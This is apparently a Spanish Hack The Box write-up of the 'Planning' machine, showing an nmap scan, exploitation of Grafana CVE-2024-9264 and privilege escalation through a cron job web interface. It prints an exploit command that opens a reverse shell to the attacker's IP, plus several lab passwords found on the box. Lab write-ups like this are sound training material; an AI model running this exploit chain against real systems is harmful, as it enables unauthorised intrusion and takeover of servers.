---
layout: post
title:  "Planning"
date:   2024-04-05 17:04:54 +0100
tags: ["OS Command Injection", "Brute Force"]
categories: ["Linux", Medium]
image: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/c9efb253e7d1d9b407113e11afdaa905.png"
---

Enumeración de puertos
```java
sudo nmap -sC -sV -p22,80 -Pn -n --open planning.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-13 18:53 CEST
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
```

Enumeración de directorios

![Nmap scan](/assets/machines/planning.htb/images/Pasted%20image%2020250813185055.webp)

Iniciar sesión Granfana
![](/assets/machines/planning.htb/images/850dc59b-4ae4-44c1-b49d-0df3e8d6542e.webp)

Versión Grafana.

![](/assets/machines/planning.htb/images/e3d1308e-1a69-4d8b-8f80-66450fa0e8db.webp)

La versión de grafana v11.0.0 es vulnerable al CVE-2024-9264.

[z3k0sec/CVE-2024-9264-RCE-Exploit: Grafana RCE exploit (CVE-2024-9264)](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit?tab=readme-ov-file#description)

Establecer una reverse shell.
```bash
$ python poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.115 --reverse-port 9000
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 9000
```

![](/assets/machines/planning.htb/images/62132e13-564c-45d2-a405-2a1a9cbe6537.webp)

Una vez dentro somos ``root`` pero de un contenedor de Docker.

Contraseña encontrada: `RioTecRANDEntANT!` usando el comando `env`.

![](/assets/machines/planning.htb/images/8566591c-8668-4594-a609-62deb56a3afc.webp)

Usamos las credenciales `enzo:RioTecRANDEntANT!` para iniciar sesión por SSH.

El fichero `/var/www/web/enroll.php` contiene las credenciales root para la base de datos `root:EXTRapHY`. Pero no nos van a servir para nada.

![](/assets/machines/planning.htb/images/841301e1-95b8-4d17-b42e-f40aa96a83ba.webp)

Por otra parte, en `/opt/crontabs/crontab.db` encontraremos unas credenciales `P4ssw0rdS0pRi0T3c`.
![](/assets/machines/planning.htb/images/7e213360-6b2d-4b76-a6cc-9036374d8d7d.webp)

Hay un puerto 8000 abierto.
![](/assets/machines/planning.htb/images/0c469827-62b5-403f-8df2-fec2ba6d7849.webp)

Usar Port Forwarding para llegar al puerto 8000 desde la la máquina atacante.
![](/assets/machines/planning.htb/images/4548ff69-7a59-4293-8186-d3fbd273d2bf.webp)

Iniciar sesión con las credenciales `root:P4ssw0rdS0pRi0T3c`.

![](/assets/machines/planning.htb/images/99b1d780-fe1a-4431-ace1-29bda1c9080b.webp)
Crear un job con una reverse shell.
![](/assets/machines/planning.htb/images/594c54d7-fe40-49ce-9a75-49ef56fb98f1.webp)

Clicar en "Run now".

![](/assets/machines/planning.htb/images/107c447b-78bf-49ac-bc7f-f0f2f10adbd7.webp)

Root txt
![](/assets/machines/planning.htb/images/7aa28a64-ab2b-4715-910b-3a20372f8aed.webp)
